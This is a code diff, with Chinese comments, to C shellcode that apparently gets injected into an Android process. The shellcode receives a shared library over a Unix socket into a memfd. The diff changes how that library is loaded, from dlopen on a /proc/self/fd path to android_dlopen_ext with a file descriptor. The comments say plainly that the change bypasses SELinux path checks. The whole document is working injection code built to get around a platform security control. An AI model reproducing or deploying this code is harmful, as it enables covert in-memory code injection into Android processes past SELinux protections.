@@ -55,6 +55,7 @@ typedef struct {
     uintptr_t dlopen;   // 动态加载
     uintptr_t dlsym;    // 动态符号查找
     uintptr_t dlerror;
+    uintptr_t android_dlopen_ext;  // fd-based dlopen (绕过 SELinux path 检查)
 } DlOffsets;
 
 // 定义函数指针类型
@@ -66,6 +67,20 @@ typedef ssize_t (*write_t)(int, const void*, size_t);
 typedef int (*close_t)(int);
 typedef char* (*strcpy_t)(char*, const char*);
 typedef void* (*dlopen_t)(const char*, int);
+
+// android_dlopen_ext for fd-based loading (bypasses SELinux path check)
+#define ANDROID_DLEXT_USE_LIBRARY_FD 0x10
+typedef struct {
+    uint64_t flags;
+    void*    reserved_addr;
+    size_t   reserved_size;
+    int      relro_fd;
+    int      library_fd;
+    off_t    library_fd_offset;
+    void*    library_namespace;
+} android_dlextinfo;
+typedef void* (*android_dlopen_ext_t)(const char*, int, const android_dlextinfo*);
+
 typedef ssize_t (*recvmsg_t)(int, struct msghdr*, int);
 typedef int (*pthread_create_t)(pthread_t*, const pthread_attr_t*, void* (*)(void*), void*);
 typedef int (*pthread_detach_t)(pthread_t);
@@ -87,6 +102,7 @@ int shellcode_entry(LibcOffsets* offsets, DlOffsets* dl, StringTable* table) {
     write_t write = (write_t)offsets->write;
     close_t close = (close_t)offsets->close;
     dlopen_t dlopen = (dlopen_t)dl->dlopen;
+    android_dlopen_ext_t android_dlopen_ext = (android_dlopen_ext_t)dl->android_dlopen_ext;
     recvmsg_t recvmsg = (recvmsg_t)offsets->recvmsg;
     dlsym_t dlsym = (dlsym_t)dl->dlsym;
     dlerror_t dlerror = (dlerror_t)dl->dlerror;
@@ -128,9 +144,12 @@ int shellcode_entry(LibcOffsets* offsets, DlOffsets* dl, StringTable* table) {
         return -1;
     }
     
-    // 准备地址结构
+    // 准备地址结构 (手动清零，shellcode不能调用memset)
     struct sockaddr_un addr;
-    memset(&addr, 0, sizeof(addr));
+    {
+        char *p = (char *)&addr;
+        for (unsigned i = 0; i < sizeof(addr); i++) p[i] = 0;
+    }
     addr.sun_family = 1;  // AF_UNIX
 
     // 使用字符串表中的socket_name
@@ -159,27 +178,23 @@ int shellcode_entry(LibcOffsets* offsets, DlOffsets* dl, StringTable* table) {
         return -3;
     }
     
-    // 构造 "/proc/self/fd/<memfd>" 路径
-    // 现在使用函数指针调用 snprintf
-    char path[64];
-    char format[5];
-    format[0] = '%';
-    format[1] = 's';
-    format[2] = '%';
-    format[3] = 'd';
-    format[4] = '\0';
-    int idx = snprintf_fn(path, sizeof(path), format, proc_path, memfd);
-    if (idx < 0 || idx >= sizeof(path)) {
-        close(memfd);
-        close(sock);
-        free(offsets);
-        free(dl);
-        free(table);
-        return -4;
+    // 使用 android_dlopen_ext fd-based 加载，绕过 SELinux path 检查
+    // 手动清零 (shellcode 不能调用 memset)
+    android_dlextinfo ext_info;
+    {
+        char *p = (char *)&ext_info;
+        for (unsigned i = 0; i < sizeof(ext_info); i++) p[i] = 0;
     }
+    ext_info.flags = ANDROID_DLEXT_USE_LIBRARY_FD;
+    ext_info.library_fd = memfd;
+    ext_info.library_fd_offset = 0;
     
-    // 加载共享库
-    void* handle = dlopen(path, RTLD_NOW);
+    // 需要传非NULL文件名，否则 linker 返回主程序 handle
+    char lib_name[10];
+    lib_name[0] = 'a'; lib_name[1] = 'g'; lib_name[2] = 'e';
+    lib_name[3] = 'n'; lib_name[4] = 't'; lib_name[5] = '.';
+    lib_name[6] = 's'; lib_name[7] = 'o'; lib_name[8] = '\0';
+    void* handle = android_dlopen_ext(lib_name, RTLD_NOW, &ext_info);
     if (!handle) {
         char* msg = dlerror();
         write(sock, msg, strlen(msg));
